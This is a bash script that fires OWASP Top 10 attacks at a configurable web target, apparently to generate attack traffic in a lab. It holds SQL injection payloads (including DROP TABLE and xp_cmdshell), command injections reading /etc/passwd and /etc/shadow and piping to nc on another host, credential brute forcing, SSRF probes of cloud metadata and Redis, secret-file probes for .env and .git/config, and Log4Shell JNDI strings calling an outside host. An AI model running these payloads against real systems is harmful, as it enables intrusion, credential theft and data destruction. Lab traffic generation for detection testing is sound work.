#!/bin/bash
###############################################################################
# OWASP Top 10 2021 Attack Script
# Systematic coverage of all OWASP Top 10 categories
###############################################################################

SUBTYPE="${1:-full}"
TARGET_IP="${2:-10.10.40.10}"
TARGET_PORT="${3:-80}"
RESULTS_DIR="${4:-.}"
BASE_URL="http://${TARGET_IP}:${TARGET_PORT}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "${SCRIPT_DIR}/configs/targets.conf" 2>/dev/null || true

mkdir -p "$RESULTS_DIR"

echo "[*] OWASP Top 10: $SUBTYPE against ${BASE_URL}"

# A03:2021 — Injection (SQL, Command, LDAP, XPath)
run_injection() {
    echo "[*] A03:2021 — Injection attacks"

    # SQL Injection variants
    local sqli_payloads=(
        "' OR 1=1--" "' OR '1'='1" "' UNION SELECT NULL,NULL--"
        "1; DROP TABLE users--" "admin'--" "' OR 1=1#"
        "1' AND 1=1--" "1' AND 1=2--" "' WAITFOR DELAY '0:0:5'--"
        "'; exec xp_cmdshell('dir')--" "1 AND SLEEP(3)"
    )

    for payload in "${sqli_payloads[@]}"; do
        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
        curl -sk "${BASE_URL}/vulnerabilities/sqli/?id=${encoded}&Submit=Submit" -o /dev/null 2>&1 || true
        curl -sk "${BASE_URL}/?q=${encoded}" -o /dev/null 2>&1 || true
        sleep 0.5
    done

    # Command injection
    local cmdi_payloads=(
        ";id" "|cat /etc/passwd" "\$(whoami)" "&& ls -la"
        "; ping -c 3 10.10.20.20" "| nc 10.10.20.20 4444"
        "\`id\`" "|| cat /etc/shadow"
    )

    for payload in "${cmdi_payloads[@]}"; do
        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
        curl -sk "${BASE_URL}/vulnerabilities/exec/" -X POST \
            -d "ip=127.0.0.1${encoded}&Submit=Submit" -o /dev/null 2>&1 || true
        sleep 0.5
    done

    # XPath injection
    curl -sk "${BASE_URL}/?user=' or '1'='1" -o /dev/null 2>&1 || true
    curl -sk "${BASE_URL}/?user=admin' or count(//user)>0 or 'a'='a" -o /dev/null 2>&1 || true

    echo "[+] Injection attacks complete"
}

# A07:2021 — Identification and Authentication Failures
run_auth() {
    echo "[*] A07:2021 — Authentication Failures"

    # Credential brute force
    local users=("admin" "root" "administrator" "test" "user" "guest")
    local passwords=("password" "123456" "admin" "root" "test" "guest" "password123" "letmein")

    for user in "${users[@]}"; do
        for pass in "${passwords[@]}"; do
            curl -sk -X POST "${BASE_URL}/login.php" \
                -d "username=${user}&password=${pass}&Login=Login" \
                -o /dev/null 2>&1 || true
            sleep 0.3
        done
    done

    # Session fixation attempt
    curl -sk "${BASE_URL}/" -H "Cookie: PHPSESSID=fixedsession123" -o /dev/null 2>&1 || true

    # Password reset abuse
    curl -sk "${BASE_URL}/forgot_password.php?user=admin" -o /dev/null 2>&1 || true

    # Default credential testing
    curl -sk "${BASE_URL}/admin/" -u "admin:admin" -o /dev/null 2>&1 || true
    curl -sk "${BASE_URL}/admin/" -u "admin:password" -o /dev/null 2>&1 || true

    echo "[+] Authentication attacks complete"
}

# A10:2021 — Server-Side Request Forgery (SSRF)
run_ssrf() {
    echo "[*] A10:2021 — SSRF attacks"

    local ssrf_urls=(
        "http://127.0.0.1/"
        "http://localhost/"
        "http://169.254.169.254/latest/meta-data/"
        "http://10.10.20.10:9200/"
        "http://[::1]/"
        "http://0x7f000001/"
        "http://2130706433/"
        "file:///etc/passwd"
        "gopher://127.0.0.1:6379/_INFO"
        "dict://127.0.0.1:6379/INFO"
    )

    for url in "${ssrf_urls[@]}"; do
        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$url'''))")
        curl -sk "${BASE_URL}/vulnerabilities/fi/?page=${encoded}" -o /dev/null 2>&1 || true
        curl -sk "${BASE_URL}/?url=${encoded}" -o /dev/null 2>&1 || true
        curl -sk -X POST "${BASE_URL}/api/fetch" \
            -H "Content-Type: application/json" \
            -d "{\"url\":\"$url\"}" -o /dev/null 2>&1 || true
        sleep 0.5
    done

    echo "[+] SSRF attacks complete"
}

# Additional OWASP categories (combined for traffic generation)
run_additional() {
    echo "[*] Additional OWASP categories"

    # A01:2021 — Broken Access Control
    echo "[*] A01: Broken Access Control..."
    curl -sk "${BASE_URL}/admin/" -o /dev/null 2>&1 || true
    curl -sk "${BASE_URL}/../../../etc/passwd" -o /dev/null 2>&1 || true
    curl -sk "${BASE_URL}/api/users" -o /dev/null 2>&1 || true
    for i in $(seq 1 10); do
        curl -sk "${BASE_URL}/user/${i}" -o /dev/null 2>&1 || true
    done

    # A02:2021 — Cryptographic Failures
    echo "[*] A02: Cryptographic Failures..."
    curl -sk "${BASE_URL}/.env" -o /dev/null 2>&1 || true
    curl -sk "${BASE_URL}/wp-config.php" -o /dev/null 2>&1 || true
    curl -sk "${BASE_URL}/config.php" -o /dev/null 2>&1 || true
    curl -sk "${BASE_URL}/.git/config" -o /dev/null 2>&1 || true

    # A05:2021 — Security Misconfiguration
    echo "[*] A05: Security Misconfiguration..."
    curl -sk "${BASE_URL}/phpinfo.php" -o /dev/null 2>&1 || true
    curl -sk "${BASE_URL}/server-status" -o /dev/null 2>&1 || true
    curl -sk "${BASE_URL}/server-info" -o /dev/null 2>&1 || true
    curl -sk -X TRACE "${BASE_URL}/" -o /dev/null 2>&1 || true

    # A06:2021 — Vulnerable Components
    echo "[*] A06: Vulnerable Components..."
    curl -sk "${BASE_URL}/" -H "User-Agent: \${jndi:ldap://10.10.20.20/test}" -o /dev/null 2>&1 || true
    curl -sk "${BASE_URL}/" -H "X-Forwarded-For: \${jndi:ldap://10.10.20.20/test}" -o /dev/null 2>&1 || true

    # A09:2021 — Security Logging Failures
    echo "[*] A09: Attempting log injection..."
    curl -sk "${BASE_URL}/" -H "User-Agent: <script>alert(1)</script>" -o /dev/null 2>&1 || true
    curl -sk "${BASE_URL}/login?user=admin%0d%0aINJECTED_LOG_ENTRY" -o /dev/null 2>&1 || true

    echo "[+] Additional OWASP attacks complete"
}

case "$SUBTYPE" in
    injection)  run_injection ;;
    auth)       run_auth ;;
    ssrf)       run_ssrf ;;
    full)
        run_injection
        sleep 5
        run_auth
        sleep 5
        run_ssrf
        sleep 5
        run_additional
        ;;
    *)
        echo "Unknown subtype: $SUBTYPE"
        echo "Available: injection, auth, ssrf, full"
        exit 1
        ;;
esac

echo "[*] OWASP Top 10 script complete"
